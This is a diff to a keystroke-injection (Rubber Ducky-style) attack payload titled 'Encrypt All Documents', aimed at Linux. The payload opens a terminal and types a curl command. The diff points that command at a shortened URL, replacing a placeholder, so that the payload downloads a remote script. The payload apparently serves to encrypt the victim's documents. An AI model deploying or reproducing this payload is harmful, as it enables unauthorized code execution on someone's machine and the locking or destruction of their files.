@@ -1,12 +1,12 @@
-REM #######################################
-REM #                                     |
-REM # Title        : Cipher All Documents |
-REM # Author       : Aleff                |
-REM # Version      : 1.0                  |
-REM # Category     : Execution            |
-REM # Target       : Linux                |
-REM #                                     |
-REM #######################################
+REM ########################################
+REM #                                      |
+REM # Title        : Encrypt All Documents |
+REM # Author       : Aleff                 |
+REM # Version      : 1.0                   |
+REM # Category     : Execution             |
+REM # Target       : Linux                 |
+REM #                                      |
+REM ########################################
 
 
 REM ATTENTION - BEFORE USING THIS PAYLOAD MAKE SURE YOU UNDERSTAND WHAT IT DOES
@@ -34,7 +34,7 @@ DELAY 1000
 CTRL-ALT t
 DELAY 2000
 
-STRING curl example.com > script.py
+STRING curl bit.ly/EncryptAllDocuments > script.py
 ENTER
 
 REM It depends by the internet connection, btw 2/3 seconds is a lot for a fiew text line...
